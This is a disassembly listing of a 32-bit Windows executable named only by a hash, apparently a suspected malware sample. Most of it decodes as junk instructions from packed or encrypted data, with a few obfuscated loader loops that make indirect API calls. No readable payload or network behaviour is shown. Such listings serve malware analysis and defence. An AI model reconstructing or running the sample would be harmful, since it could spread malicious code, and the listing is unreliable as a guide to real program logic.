
a22b31bf57f7013eb97d9f5d552877d185b633ea62641fe99ef2c7d8b93b20d1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xc6240cf7
  40101f:	daa    
  401020:	mov    esi,0x78787878
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080aef
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	inc    ecx
  4010d2:	push   edi
  4010d3:	or     ch,BYTE PTR [ebp+edx*8-0x122b5356]
  4010da:	fs cmp DWORD PTR es:[edi+0x1351b1c0],esi
  4010e2:	xchg   edi,eax
  4010e3:	in     eax,0xde
  4010e5:	add    DWORD PTR [ebx],0x1ea85f8f
  4010eb:	cmp    al,0xea
  4010ed:	pop    edx
  4010ee:	pop    ecx
  4010ef:	cmp    al,0x25
  4010f1:	xchg   bl,al
  4010f3:	cmp    al,BYTE PTR [edi]
  4010f5:	add    ebp,esi
  4010f7:	cmp    eax,0x75dd4bb9
  4010fc:	fst    DWORD PTR [edx-0xf]
  4010ff:	sti    
  401100:	adc    BYTE PTR [ebp+0x4e],ah
  401103:	dec    edx
  401104:	js     0x4010e5
  401106:	hlt    
  401107:	cmp    eax,0x89d693a7
  40110c:	pop    esi
  40110d:	push   0x37
  40110f:	sub    eax,0x321a083e
  401114:	cwde   
  401115:	mov    al,ds:0xdc4f08a1
  40111a:	in     al,0xa2
  40111c:	and    BYTE PTR [esi-0x6d],dl
  40111f:	and    eax,0xd85ffccb
  401124:	and    ch,al
  401126:	mov    edi,DWORD PTR [esi-0x694f28c9]
  40112c:	hlt    
  40112d:	aad    0xdb
  40112f:	push   edi
  401130:	enter  0x21bc,0xf8
  401134:	daa    
  401135:	(bad)  
  401136:	out    0x76,eax
  401138:	mov    dh,0x69
  40113a:	jne    0x401199
  40113c:	out    dx,eax
  40113d:	cmp    eax,0xe8076cb2
  401142:	mov    DWORD PTR [eax],esi
  401144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401145:	cld    
  401146:	add    ebp,DWORD PTR [edx-0x7c75bcca]
  40114c:	adc    al,0x3
  40114e:	mov    ch,0xe
  401150:	mov    al,ds:0xd0eed949
  401155:	outs   dx,BYTE PTR ds:[esi]
  401156:	mov    dh,ch
  401158:	(bad)  
  401159:	dec    edi
  40115a:	jns    0x4011d8
  40115c:	leave  
  40115d:	jl     0x40114a
  40115f:	xchg   ebp,eax
  401160:	add    eax,DWORD PTR [eax]
  401162:	cmc    
  401163:	out    0xa6,al
  401165:	call   0x1172:0xf5fe322a
  40116c:	pop    es
  40116d:	imul   eax,DWORD PTR [esi-0xbf5db63],0xffffffb2
  401174:	sbb    ebx,DWORD PTR [edx]
  401176:	sbb    BYTE PTR [ebp-0x62],ch
  401179:	xchg   ebp,eax
  40117a:	(bad)  
  40117b:	popa   
  40117c:	or     esi,edi
  40117e:	cmp    ecx,ebp
  401180:	adc    edx,DWORD PTR [ebx]
  401182:	xchg   BYTE PTR [edi-0x46],cl
  401185:	push   esp
  401186:	xor    al,0xd5
  401188:	xor    ecx,DWORD PTR [eax+0x5d]
  40118b:	adc    al,0xdd
  40118d:	data16 adc al,0xbf
  401190:	mov    cl,0xa6
  401192:	retf   
  401193:	lods   al,BYTE PTR ds:[esi]
  401194:	aam    0xec
  401196:	call   0x3d91ed1a
  40119b:	or     al,BYTE PTR [edx-0x2cfd7684]
  4011a1:	add    eax,0xc94f8670
  4011a6:	cs push 0x35282f73
  4011ac:	and    cl,dh
  4011ae:	push   0x3b
  4011b0:	and    ah,BYTE PTR [esi+0x45]
  4011b3:	inc    ecx
  4011b4:	iret   
  4011b5:	pop    es
  4011b6:	popf   
  4011b7:	inc    esi
  4011b8:	imul   eax,DWORD PTR [edi-0x78cb0214],0x3429e9ea
  4011c2:	out    dx,eax
  4011c3:	jo     0x401208
  4011c5:	sbb    ecx,DWORD PTR [edi+eax*8]
  4011c8:	fsub   DWORD PTR [eax+esi*4-0x54083a0e]
  4011cf:	pop    ecx
  4011d0:	fmulp  st(1),st
  4011d2:	imul   edx,DWORD PTR [esi-0xa43f92c],0x20
  4011d9:	xchg   DWORD PTR [edx-0x13eb3300],ebp
  4011df:	cld    
  4011e0:	mov    ebx,0xf2a2391f
  4011e5:	in     al,dx
  4011e6:	jle    0x401255
  4011e8:	into   
  4011e9:	mov    ds:0x45e780a0,eax
  4011ee:	mov    WORD PTR [edx],ds
  4011f0:	mov    esi,0x96cfac3
  4011f5:	aad    0xe8
  4011f7:	adc    DWORD PTR [ecx-0x71],edx
  4011fa:	adc    esi,DWORD PTR [eax+ebp*8+0x1f8fb9d0]
  401201:	inc    eax
  401202:	mov    bh,0x6d
  401204:	push   0x53c30da5
  401209:	les    ebp,FWORD PTR [ecx+0x3e783a49]
  40120f:	add    BYTE PTR [eax+0x22],cl
  401212:	sub    ah,0xa3
  401215:	cmp    DWORD PTR [ecx],eax
  401217:	(bad)  
  401218:	in     eax,dx
  401219:	mov    edi,0x4766622f
  40121e:	cs add al,0xf8
  401221:	retfw  0x1e0b
  401225:	jp     0x4011c5
  401227:	sar    DWORD PTR [esi],cl
  401229:	pop    esi
  40122a:	push   cs
  40122b:	data16 fadd DWORD PTR [edx-0x17e049fe]
  401232:	test   al,0xa2
  401234:	inc    eax
  401235:	push   es
  401236:	inc    esp
  401237:	dec    esp
  401238:	(bad)  
  401239:	mov    eax,ds:0xd6036e02
  40123e:	jo     0x401234
  401240:	jecxz  0x4011ec
  401242:	fst    DWORD PTR [ebx]
  401244:	sub    DWORD PTR [ecx+0x38],0x47806bc1
  40124b:	out    0x2b,al
  40124d:	scas   eax,DWORD PTR es:[edi]
  40124e:	push   0x3f
  401250:	mov    eax,ds:0x31611949
  401255:	test   al,dh
  401257:	ror    BYTE PTR [esi],cl
  401259:	lds    edi,FWORD PTR [eax]
  40125b:	imul   edi,DWORD PTR [ebp-0x7b],0xe744155
  401262:	xor    DWORD PTR [ebp-0x317e54b4],esp
  401268:	or     al,0xfc
  40126a:	dec    edx
  40126b:	sbb    BYTE PTR [edi-0x1a],0x4b
  40126f:	gs ja  0x4012d4
  401272:	cld    
  401273:	test   DWORD PTR [edx+0x4f6f7fb8],edi
  401279:	dec    edx
  40127a:	jno    0x40128c
  40127c:	ret    
  40127d:	mov    dh,0x55
  40127f:	nop
  401280:	std    
  401281:	xchg   ecx,eax
  401282:	pop    esp
  401283:	xchg   BYTE PTR [ebp+0x5c258172],dl
  401289:	mov    ah,0x74
  40128b:	test   DWORD PTR [edx-0x5dd7a1e9],esp
  401291:	in     eax,dx
  401292:	sub    BYTE PTR [ecx+0x24],bl
  401295:	js     0x40121b
  401297:	mov    ecx,0x7ffc7395
  40129c:	(bad)  ds:0x933da810
  4012a2:	aaa    
  4012a3:	dec    eax
  4012a4:	cmp    BYTE PTR ss:[ecx],ah
  4012a7:	pop    ebx
  4012a8:	jg     0x401328
  4012aa:	jne    0x40124d
  4012ac:	out    0xea,al
  4012ae:	inc    ecx
  4012af:	add    BYTE PTR [ecx],dh
  4012b1:	adc    eax,0x42a80d
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x75],1
  401422:	jae    0x40140a
  401424:	jb     0x401424
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401452
  40142e:	mov    ds:0xb34696d5,eax
  401433:	jmp    0x4013df
  401435:	fdivr  DWORD PTR ds:[edx]
  401438:	lods   eax,DWORD PTR ds:[esi]
  401439:	jns    0x401487
  40143b:	pop    esi
  40143c:	inc    esp
  40143d:	push   es
  40143e:	cwde   
  40143f:	aas    
  401440:	add    dh,BYTE PTR [ebx]
  401442:	push   ecx
  401443:	or     al,0xed
  401445:	push   ss
  401446:	int    0x91
  401448:	into   
  401449:	das    
  40144a:	mov    ch,0xaf
  40144c:	jb     0x401480
  40144e:	imul   eax,DWORD PTR [edx-0x3fda19d7],0xb5baf618
  401458:	jge    0x4013f4
  40145a:	jl     0x401414
  40145c:	lods   eax,DWORD PTR ds:[esi]
  40145d:	fnstsw WORD PTR [ebx-0x33]
  401460:	out    0x1c,al
  401462:	(bad)  
  401463:	in     al,dx
  401464:	icebp  
  401465:	xchg   esi,eax
  401466:	arpl   WORD PTR [ebx],ax
  401468:	and    dl,BYTE PTR [edx-0x1984fdb4]
  40146e:	pop    es
  40146f:	or     dh,bl
  401471:	and    ebp,DWORD PTR [eax]
  401473:	pop    es
  401474:	push   esp
  401475:	jno    0x4013fa
  401477:	aam    0xd3
  401479:	scas   eax,DWORD PTR es:[edi]
  40147a:	xchg   BYTE PTR [edi+0x73b0bf79],cl
  401480:	test   BYTE PTR [edi],al
  401482:	pop    ebp
  401483:	dec    ebx
  401484:	cmp    bl,BYTE PTR [ecx+0x75]
  401487:	push   0x1da090ca
  40148c:	add    dl,BYTE PTR [edx-0x1bd6c7f2]
  401492:	cmp    DWORD PTR [edx+0x1a],esp
  401495:	adc    cl,BYTE PTR [eax]
  401497:	and    al,0xb7
  401499:	je     0x401476
  40149b:	push   ds
  40149c:	push   cs
  40149d:	add    edx,DWORD PTR [edx]
  40149f:	xor    ch,cl
  4014a1:	mov    DWORD PTR [ecx],edx
  4014a3:	dec    ebx
  4014a4:	rol    bh,0x8d
  4014a7:	test   DWORD PTR [edi+0x52],edi
  4014aa:	sbb    dl,BYTE PTR [ebx]
  4014ac:	jno    0x4014d3
  4014ae:	repnz xor eax,0x6c4eb9bb
  4014b4:	jecxz  0x4014bc
  4014b6:	sub    bl,BYTE PTR [esi+eax*2-0x4b25ffd8]
  4014bd:	aam    0xe9
  4014bf:	sahf   
  4014c0:	add    eax,0x6596ecf6
  4014c5:	mov    dh,0xf0
  4014c7:	(bad)  
  4014c8:	jbe    0x401547
  4014ca:	ins    DWORD PTR es:[edi],dx
  4014cb:	lahf   
  4014cc:	pop    ecx
  4014cd:	jbe    0x4014b9
  4014cf:	lea    ebx,[edi-0x7a6f2130]
  4014d5:	daa    
  4014d6:	mov    al,ds:0xe2b11192
  4014db:	jecxz  0x40153e
  4014dd:	sub    eax,0xe2ee69ef
  4014e2:	dec    edx
  4014e3:	dec    ebp
  4014e4:	and    DWORD PTR [edx+0x45],0x8cf6598b
  4014eb:	shl    BYTE PTR [esi+0x6785562b],cl
  4014f1:	push   edx
  4014f2:	xor    al,dl
  4014f4:	icebp  
  4014f5:	stc    
  4014f6:	popa   
  4014f7:	dec    ebp
  4014f8:	adc    DWORD PTR [eax+0x4bfa4132],0xff8ce613
  401502:	pop    ecx
  401503:	mov    dl,0xa6
  401505:	inc    edi
  401506:	je     0x4014ae
  401508:	test   BYTE PTR [ebx],cl
  40150a:	pop    ss
  40150b:	scas   eax,DWORD PTR es:[edi]
  40150c:	pop    es
  40150d:	jne    0x401515
  40150f:	push   ss
  401510:	pop    edx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	pop    ecx
  401513:	ins    BYTE PTR es:[edi],dx
  401514:	mov    ds:0xf763ed28,eax
  401519:	mov    edi,0x5c02909a
  40151e:	xlat   BYTE PTR ds:[ebx]
  40151f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401520:	aam    0x58
  401522:	int    0x71
  401524:	std    
  401525:	(bad)  
  401526:	shl    DWORD PTR [edx-0x1f],1
  401529:	cmp    dl,cl
  40152b:	setb   BYTE PTR [esi]
  40152e:	mov    eax,0x3fef356a
  401533:	sahf   
  401534:	jl     0x401551
  401536:	mov    ebp,0xca69a4b1
  40153b:	not    BYTE PTR [ebp+ebp*1-0x15]
  40153f:	xor    al,0x56
  401541:	test   al,0xc8
  401543:	in     eax,dx
  401544:	std    
  401545:	ja     0x40151f
  401547:	cwde   
  401548:	adc    eax,0xfddcede1
  40154d:	jo     0x401599
  40154f:	xchg   ebx,eax
  401550:	jnp    0x4014fa
  401552:	sub    al,0x97
  401554:	pop    eax
  401555:	stos   DWORD PTR es:[edi],eax
  401556:	jae    0x4015af
  401558:	sbb    eax,DWORD PTR [ecx]
  40155a:	(bad)  
  40155b:	pop    esi
  40155c:	fwait
  40155d:	outs   dx,BYTE PTR ds:[esi]
  40155e:	xor    al,cl
  401560:	hlt    
  401561:	mov    eax,ds:0xa37734ce
  401566:	int3   
  401567:	lds    eax,FWORD PTR [ecx+0x116698d4]
  40156d:	sbb    eax,0x706928dd
  401572:	nop
  401573:	xor    BYTE PTR [edi],ch
  401575:	cmc    
  401576:	dec    ebx
  401577:	mov    esp,0xddb19126
  40157c:	cmp    ch,BYTE PTR [edx]
  40157e:	ins    BYTE PTR es:[edi],dx
  40157f:	arpl   WORD PTR [ebx-0xb7a78e1],sp
  401585:	push   ebx
  401586:	out    dx,al
  401587:	xor    al,0x7b
  401589:	std    
  40158a:	outs   dx,DWORD PTR ds:[esi]
  40158b:	inc    edi
  40158c:	pop    ebp
  40158d:	popa   
  40158e:	cmc    
  40158f:	aam    0x53
  401591:	cmp    al,0xfc
  401593:	jb     0x4015f4
  401595:	sbb    ah,BYTE PTR [eax-0x1]
  401598:	xor    esi,DWORD PTR [ecx-0x2e]
  40159b:	std    
  40159c:	aam    0xad
  40159e:	push   0x44
  4015a0:	out    0xba,al
  4015a2:	xchg   DWORD PTR [ebp+0x68],esp
  4015a5:	jnp    0x401602
  4015a7:	dec    ebp
  4015a8:	add    ebp,edi
  4015aa:	stc    
  4015ab:	scas   al,BYTE PTR es:[edi]
  4015ac:	cmp    BYTE PTR [eax-0x37f612b9],0x76
  4015b3:	or     cl,BYTE PTR [eax]
  4015b5:	push   0x2b
  4015b7:	bound  edx,QWORD PTR [ebx]
  4015b9:	stc    
  4015ba:	sub    esi,ebp
  4015bc:	(bad)  
  4015bd:	jmp    0xbe3ab00f
  4015c2:	jo     0x4015b6
  4015c4:	jmp    0x40155d
  4015c6:	pop    ebx
  4015c7:	stos   DWORD PTR es:[edi],eax
  4015c8:	sar    BYTE PTR [edx-0x3b],cl
  4015cb:	data16 daa 
  4015cd:	ins    BYTE PTR es:[edi],dx
  4015ce:	mov    eax,0xab7b679a
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	add    ecx,eax
  4015d6:	mov    ecx,0x139f0600
  4015db:	stc    
  4015dc:	loopne 0x401608
  4015de:	pop    edi
  4015df:	xchg   esp,eax
  4015e0:	out    0x82,al
  4015e2:	lods   al,BYTE PTR ds:[esi]
  4015e3:	pop    esp
  4015e4:	mov    ds:0xee066911,al
  4015e9:	(bad)  
  4015eb:	sar    BYTE PTR [esi-0x749a4dbe],cl
  4015f1:	adc    dh,ah
  4015f3:	mov    ecx,0x67dbbb16
  4015f8:	sub    eax,0xaa6e92e8
  4015fd:	dec    ebp
  4015fe:	xor    eax,0x7a169c6
  401603:	xchg   edi,eax
  401604:	sti    
  401605:	sbb    al,0x23
  401607:	outs   dx,DWORD PTR ds:[esi]
  401608:	xchg   ebp,eax
  401609:	dec    esi
  40160a:	rcl    BYTE PTR [ecx],cl
  40160c:	(bad)  
  40160d:	or     edx,DWORD PTR [ebp+0x78]
  401610:	ss mov ebp,0xe1923275
  401616:	ss jae 0x401678
  401619:	(bad)
  40161d:	or     edi,edx
  40161f:	test   DWORD PTR [esi],ecx
  401621:	leave  
  401622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401623:	push   ds
  401624:	push   ebx
  401625:	mov    ch,0x50
  401627:	fst    DWORD PTR [edi]
  401629:	push   ss
  40162a:	fist   DWORD PTR [esi+edx*8-0x38619814]
  401631:	mov    eax,ds:0xc8a37378
  401636:	mov    esp,0x2987d51f
  40163b:	xchg   esp,eax
  40163c:	xor    al,0x5e
  40163e:	lea    ebp,[esi-0x2c]
  401641:	out    0xba,eax
  401643:	dec    edi
  401644:	push   ebp
  401645:	ss inc ebx
  401647:	(bad)  
  401648:	mov    BYTE PTR ds:[esi],dh
  40164b:	bound  edi,QWORD PTR [edi+0x68]
  40164e:	cmp    eax,0xb0385439
  401653:	sbb    ebp,DWORD PTR [esi+eax*8]
  401656:	daa    
  401657:	mov    ch,0xd
  401659:	dec    esi
  40165a:	fst    QWORD PTR [esi-0x28808959]
  401660:	sub    DWORD PTR [esp+ecx*2],ebp
  401663:	add    DWORD PTR ds:0xc9fcd136,ecx
  401669:	pop    ecx
  40166a:	int    0x34
  40166c:	clc    
  40166d:	addr16 jmp 0x4016bd
  401670:	adc    DWORD PTR [edi],ebp
  401672:	mov    ebx,0x8bbe49f7
  401677:	and    BYTE PTR [ebp+0x6f],al
  40167a:	js     0x4016a7
  40167c:	leave  
  40167d:	jge    0x401688
  40167f:	ds inc edi
  401681:	dec    esp
  401682:	retf   0x654c
  401685:	dec    esi
  401686:	push   es
  401687:	outs   dx,BYTE PTR ds:[esi]
  401688:	sbb    DWORD PTR [ecx+0x707a42b6],eax
  40168e:	inc    ecx
  40168f:	jo     0x401656
  401691:	push   ecx
  401692:	(bad)  
  401693:	sub    bh,BYTE PTR [eax+0x40]
  401696:	aam    0xd2
  401698:	push   ebx
  401699:	jno    0x40163d
  40169b:	shr    al,0xe4
  40169e:	dec    edx
  40169f:	das    
  4016a0:	pop    edx
  4016a1:	int    0x3d
  4016a3:	fwait
  4016a4:	xchg   ecx,eax
  4016a5:	test   DWORD PTR [eax+eiz*2+0x2042f777],esp
  4016ac:	dec    esi
  4016ad:	sub    al,0x31
  4016af:	add    eax,edi
  4016b1:	xor    DWORD PTR ds:0x42a84d,0x53dc
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz dec ecx
  4016f5:	jecxz  0x4016a1
  4016f7:	loope  0x401775
  4016f9:	add    edi,DWORD PTR [eax+0x78]
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x4016e5
  401701:	cmp    BYTE PTR [esi-0x72],dl
  401704:	cld    
  401705:	out    0x8a,eax
  401707:	xchg   edi,eax
  401708:	or     ah,bl
  40170a:	xchg   ecx,eax
  40170b:	inc    eax
  40170c:	sub    esp,DWORD PTR [ebx+0x22]
  40170f:	ins    DWORD PTR es:[edi],dx
  401710:	push   0x6c
  401712:	dec    ebx
  401713:	inc    ebp
  401714:	mov    al,0x28
  401716:	mov    dl,0x31
  401718:	out    0x98,al
  40171a:	jns    0x4016d5
  40171c:	fwait
  40171d:	cdq    
  40171e:	sbb    BYTE PTR [esi],0x1f
  401721:	dec    esp
  401722:	add    BYTE PTR [esi-0x1229050f],cl
  401728:	jmp    0x6611:0xcc8430a3
  40172f:	add    eax,0x7c9420b5
  401734:	data16 icebp 
  401736:	jbe    0x401779
  401738:	icebp  
  401739:	test   ecx,esi
  40173b:	fmul   DWORD PTR [ebp-0x2]
  40173e:	(bad)
  401742:	jmp    0x5e61:0xeaec198c
  401749:	sub    cl,BYTE PTR [edi+ebp*1]
  40174c:	sbb    al,BYTE PTR [esi+ecx*8]
  40174f:	je     0x4016e1
  401751:	adc    al,0x78
  401753:	icebp  
  401754:	pmaxub mm3,QWORD PTR ss:[ebx]
  401758:	sub    eax,0x747f1008
  40175d:	mov    al,0xf3
  40175f:	cmp    ch,BYTE PTR [ebx]
  401761:	fidiv  WORD PTR [ecx-0x66]
  401764:	cdq    
  401765:	pop    ecx
  401766:	push   esp
  401767:	push   ds
  401768:	push   ebp
  401769:	(bad)  
  40176b:	outs   dx,DWORD PTR ds:[esi]
  40176c:	or     dh,bl
  40176e:	out    dx,eax
  40176f:	lahf   
  401770:	inc    edi
  401771:	ficom  DWORD PTR [ebx]
  401773:	comiss xmm0,DWORD PTR [edi+edx*2-0x4f]
  401778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401779:	shr    BYTE PTR [ecx-0x66],cl
  40177c:	in     al,dx
  40177d:	ins    BYTE PTR es:[edi],dx
  40177e:	jmp    0xc18e:0x31503101
  401785:	or     al,0x8d
  401787:	imul   esp,esi,0xffffffcb
  40178a:	ss push esi
  40178c:	shl    DWORD PTR [edi-0x7623a0ce],1
  401792:	sub    BYTE PTR [edx-0x3b],bl
  401795:	mov    dl,0x69
  401797:	into   
  401798:	mov    esp,0x1b802ef
  40179d:	push   esp
  40179e:	sbb    cl,bl
  4017a0:	mov    ebp,0x1de5ce05
  4017a5:	out    dx,al
  4017a6:	shl    edi,cl
  4017a8:	test   edi,0x6b7e89a5
  4017ae:	div    eax
  4017b0:	sbb    DWORD PTR [esp+ecx*2+0x3b5a91fa],eax
  4017b7:	sti    
  4017b8:	sahf   
  4017b9:	cli    
  4017ba:	into   
  4017bb:	popa   
  4017bc:	sahf   
  4017bd:	mov    al,0xda
  4017bf:	sbb    DWORD PTR [ebp+edi*8+0x7af591c4],eax
  4017c6:	adc    esp,DWORD PTR [esi+0x7d]
  4017c9:	inc    ecx
  4017ca:	(bad)  
  4017cb:	mov    ds:0xe55a514,al
  4017d0:	xchg   ecx,eax
  4017d1:	mov    al,BYTE PTR [ebp+ebp*4+0x78]
  4017d5:	adc    ebx,ebp
  4017d7:	xor    cl,BYTE PTR [ebp+0x18]
  4017da:	fisttp QWORD PTR [edi]
  4017dc:	mov    WORD PTR [eax],ss
  4017de:	adc    BYTE PTR [ecx],ch
  4017e0:	call   0x5b5e:0x1647aabf
  4017e7:	retf   0x4b54
  4017ea:	lds    edi,FWORD PTR [esi*8-0x2031e9d8]
  4017f1:	outs   dx,DWORD PTR ds:[esi]
  4017f2:	repz ret 0x59ce
  4017f6:	call   0x8f84f33c
  4017fb:	setge  BYTE PTR [esi-0x6c]
  4017ff:	arpl   WORD PTR [edx+0x3bd5ef69],dx
  401805:	popa   
  401806:	push   ebp
  401807:	xor    al,0xa8
  401809:	adc    al,0x5e
  40180b:	mov    edx,DWORD PTR [eax+0x70]
  40180e:	sbb    DWORD PTR [ebp+0x1],ebx
  401811:	(bad)  
  401812:	fcomp  QWORD PTR [edi+0x28]
  401815:	imul   esi
  401817:	fcomp  QWORD PTR [ebx-0x37649fda]
  40181d:	cmp    al,0x2f
  40181f:	cwde   
  401820:	inc    ebp
  401821:	(bad)  
  401822:	jb     0x40184d
  401824:	sbb    DWORD PTR [edi],edx
  401826:	push   eax
  401827:	imul   esi,DWORD PTR [eax-0x4956e6bb],0xf65623b7
  401831:	xor    eax,0xad5492e8
  401836:	xchg   edx,eax
  401837:	jmp    0xccf7:0x68731585
  40183e:	xor    ch,BYTE PTR [edi-0x55]
  401841:	adc    DWORD PTR [edx-0x31],eax
  401844:	fwait
  401845:	lock iret 
  401847:	cdq    
  401848:	cwde   
  401849:	and    bl,ah
  40184b:	xor    BYTE PTR [esi+eax*2],dl
  40184e:	xor    al,0x18
  401850:	mov    ds:0x4739846,eax
  401855:	or     dh,BYTE PTR [eax]
  401857:	int    0xc5
  401859:	xor    BYTE PTR [ecx-0x24],dl
  40185c:	int3   
  40185d:	mov    al,0xee
  40185f:	and    al,BYTE PTR [ebx-0x7f7fd400]
  401865:	jle    0x40180c
  401867:	lahf   
  401868:	inc    ebx
  401869:	add    DWORD PTR [edi-0x21],esi
  40186c:	mov    eax,ds:0x140772f5
  401871:	jne    0x40185d
  401873:	rol    BYTE PTR ds:0xb090d40b,cl
